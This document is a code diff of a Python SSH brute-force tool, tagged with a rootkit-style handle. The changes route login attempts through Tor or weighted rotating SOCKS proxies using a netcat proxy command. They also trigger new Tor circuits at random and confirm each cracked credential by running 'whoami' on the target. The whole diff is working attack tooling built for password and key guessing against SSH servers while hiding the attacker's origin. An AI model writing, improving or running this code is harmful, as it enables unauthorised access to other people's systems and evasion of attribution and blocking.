@@ -1,3 +1,5 @@
+# $NoneR00tk1t$
+# $28 Oc 2025$
 import socket
 import random
 import colorama
@@ -302,47 +304,32 @@ class SSHBruteForce:
 
     async def test_connection(self) -> bool:
         for attempt in range(self.max_retries):
+            proxy_cmd = await self._get_proxy_command()
             try:
-                sock = await self._create_socket()
-                reader, writer = await asyncio.wait_for(
-                    asyncio.open_connection(sock=sock, host=self.hostname, port=self.port),
-                    timeout=self.timeout
-                )
-                writer.close()
-                await writer.wait_closed()
-                logger.info(f"Connection test successful to {self.hostname}:{self.port}")
-                return True
+                async with asyncssh.connect(
+                    self.hostname, self.port, known_hosts=None,
+                    connect_timeout=self.timeout, proxy_command=proxy_cmd
+                ):
+                    logger.info(f"Connection test successful to {self.hostname}:{self.port}")
+                    return True
             except Exception as e:
                 logger.warning(f"Connection attempt {attempt + 1}/{self.max_retries} failed: {e}")
                 await asyncio.sleep(min(2 ** attempt + random.uniform(0, 0.5), self.max_delay))
-                self._rotate_proxy()
         logger.error(f"Unable to connect to {self.hostname}:{self.port} after {self.max_retries} attempts")
         return False
 
-    async def _create_socket(self):
+    async def _get_proxy_command(self) -> Optional[str]:
         if self.use_tor and random.random() < 0.5:
-            sock = socks.socksocket()
-            sock.set_proxy(socks.SOCKS5, '127.0.0.1', self.tor_socks_port)
-            return sock
-        if not self.proxy_pool:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(self.timeout)
-            return sock
-        proxy = await self._get_best_proxy()
-        sock = socks.socksocket()
-        sock.set_proxy(getattr(socks, proxy.type.upper()), proxy.host, proxy.port, 
-                      True if proxy.username else False, proxy.username, proxy.password)
-        sock.settimeout(self.timeout)
-        return sock
-
-    async def _get_best_proxy(self) -> ProxyInfo:
-        if not self.proxy_pool:
-            raise ValueError("No proxies available")
-        valid_proxies = [p for p in self.proxy_pool if p.failures < 3 and p.success_count > 0]
-        if not valid_proxies:
-            valid_proxies = self.proxy_pool
-        weights = [1 / (p.latency + 0.01) * (p.success_count + 1) for p in valid_proxies]
-        return random.choices(valid_proxies, weights=weights, k=1)[0]
+            if self.tor_controller and random.random() < 0.1:
+                try: self.tor_controller.signal('NEWCIRCUIT')
+                except: pass
+            return f"nc -X 5 -x 127.0.0.1:{self.tor_socks_port} %h %p"
+        if self.proxy_pool:
+            valid = [p for p in self.proxy_pool if p.failures < 3 and p.success_count > 0]
+            if valid:
+                p = random.choices(valid, weights=[1/(p.latency+0.01) for p in valid])[0]
+                return f"nc -X 5 -x {p.host}:{p.port} %h %p"
+        return None
 
     def _rotate_proxy(self):
         self.current_proxy_idx = (self.current_proxy_idx + 1) % max(1, len(self.proxy_pool))
@@ -430,12 +417,14 @@ class SSHBruteForce:
         try:
             self.active_connections += 1
             
+            proxy_cmd = await self._get_proxy_command()
             connect_kwargs = {
                 'host': self.hostname,
                 'port': self.port,
                 'username': username,
                 'connect_timeout': self.timeout,
                 'known_hosts': None,
+                'proxy_command': proxy_cmd
             }
             
             if password:
@@ -446,7 +435,7 @@ class SSHBruteForce:
                 connect_kwargs['client_keys'] = [str(temp_key_file)]
             
             try:
-                async with asyncssh.connect(**connect_kwargs) as conn:
+                async with self.circuit_breaker.execute(asyncssh.connect(**connect_kwargs)) as conn:
                     result = await conn.run('whoami', check=True)
                     if username in result.stdout:
                         auth_type = "password" if password else "key"
@@ -907,8 +896,6 @@ async def main():
         if brute_force.tor_controller:
             brute_force.tor_controller.close()
 
-
-
 colorama.init(autoreset=True)
 def print_banner():
     print(f"""
@@ -933,9 +920,7 @@ def print_banner():
 {Fore.LIGHTBLACK_EX}-------------------------------------
 {Style.RESET_ALL}
     """)
-    
+
 if __name__ == "__main__":
     print_banner()
-
     asyncio.run(main())
-
